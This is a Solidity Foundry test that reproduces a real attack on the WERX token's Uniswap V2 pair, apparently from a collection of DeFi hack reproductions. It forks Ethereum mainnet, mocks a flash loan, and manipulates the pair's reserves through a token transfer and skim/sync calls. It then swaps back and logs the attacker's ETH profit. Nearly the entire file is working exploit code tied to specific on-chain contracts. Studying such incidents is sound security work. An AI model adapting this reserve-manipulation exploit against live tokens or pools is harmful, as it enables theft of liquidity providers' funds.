// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~176 ETH
// Attacker : https://etherscan.io/address/0x6057a831d43c395198a10cf2d7d6d6a063b1fce4
// Attack Contract : https://etherscan.io/address/0xda2ccfc4557ba55eada3cbebd0aeffcf97fc14ca
// Vulnerable Contract : https://etherscan.io/token/0x4306b12f8e824ce1fa9604bbd88f2ad4f0fe3c54
// Attack Tx : https://etherscan.io/tx/0x3b19e152943f31fe0830b67315ddc89be9a066dc89174256e17bc8c2d35b5af8
// Detail : https://explorer.phalcon.xyz/tx/eth/0x3b19e152943f31fe0830b67315ddc89be9a066dc89174256e17bc8c2d35b5af8

// @Info
// Vulnerable Contract Code : https://etherscan.io/token/0x4306b12f8e824ce1fa9604bbd88f2ad4f0fe3c54

// @Analysis
// Twitter Guy : https://twitter.com/deeberiroz/status/1686683788795846657

contract ContractTest is Test {
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 WERX = IERC20(0x4306B12F8e824cE1fa9604BbD88f2AD4f0FE3c54);
    Uni_Router_V2 Router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    Uni_Pair_V2 pair = Uni_Pair_V2(0xa41529982BcCCDfA1105C6f08024DF787CA758C4);

    function setUp() public {
        vm.createSelectFork("https://eth.llamarpc.com", 17_826_202);
        vm.label(address(WETH), "WETH");
        vm.label(address(WERX), "WERX");
        vm.label(address(Router), "Router");
        vm.label(address(pair), "pair");
    }

    function testExploit() external {
        // mock a flash loan for simplicity
        deal(address(WETH), address(this), 20_000 ether);
        WETH.approve(address(Router), type(uint256).max);
        WERX.approve(address(Router), type(uint256).max);

        pair.sync();

        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(WERX);

        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            20_000 ether, 0, path, address(this), block.timestamp
        );

        WERX.transfer(address(pair), 4_429_817_738_575_912_760_684_500);

        pair.skim(address(0x01));
        pair.sync();

        path[0] = address(WERX);
        path[1] = address(WETH);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WERX.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );

        emit log_named_decimal_uint(
            "Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals()
        );

        emit log_named_decimal_uint(
            "Attacker WETH balance after exploit, ETH PROFIT",
            WETH.balanceOf(address(this)) - 20_000 ether,
            WETH.decimals()
        );
    }
}
